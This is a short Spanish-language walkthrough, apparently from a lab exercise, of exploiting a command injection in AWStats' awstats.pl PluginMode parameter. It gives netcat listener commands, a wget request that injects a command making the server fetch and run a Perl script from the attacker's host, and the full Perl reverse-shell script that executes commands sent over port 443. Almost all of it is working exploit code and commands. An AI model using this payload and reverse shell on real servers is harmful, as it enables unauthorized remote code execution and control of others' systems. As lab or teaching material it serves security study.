En dos terminales diferentes ejecutamos:
  sudo nc -lvnp 80 < script.pl
  sudo nc -lvnp 443

Después ejecutamos:
  wget --no-proxy "http://10.0.2.5/awstats/awstats.pl?&amp;PluginMode=:print+system('nc+10.0.2.4+80+|+/usr/bin/perl')+;"

Con este comando, el servidor estableció una conexión al puerto 443 del atacante y desde la terminal que escuchaba en ese
puerto obtuvimos acceso a la shell.

El archivo script.pl contiene:

#!/usr/bin/perl
use Net::Telnet ();
use Net::Telnet;
($ip) = "10.0.2.4";
print("$ip\n");
$telnet = new Net::Telnet ( Timeout=>1, Port=>443);
$telnet->open($ip);
$count=1;
$telnet->print('Acceso desde equipo remoto');
$pattern='/\$ $/i';
while ($count == 1) {
    $data = $telnet->get(Timeout=>100);
    $output = `$data`;
    $telnet->print($output);
}
exit 0
